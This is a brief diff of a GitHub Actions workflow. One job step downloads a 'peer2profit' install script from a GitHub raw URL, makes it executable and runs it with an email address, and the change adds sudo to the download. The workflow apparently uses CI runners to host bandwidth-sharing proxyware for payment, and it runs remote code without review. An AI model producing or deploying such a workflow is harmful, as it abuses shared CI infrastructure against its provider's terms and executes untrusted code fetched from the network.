@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: BA_channel
       run: |
-        curl -L https://raw.githubusercontent.com/spiritLHLS/peer2profit-one-click-command-installation/main/p.sh -o p.sh && chmod +x p.sh && bash p.sh -m mallory121@protonmail.com
+        sudo curl -L https://raw.githubusercontent.com/spiritLHLS/peer2profit-one-click-command-installation/main/p.sh -o p.sh && chmod +x p.sh && bash p.sh -m mallory121@protonmail.com
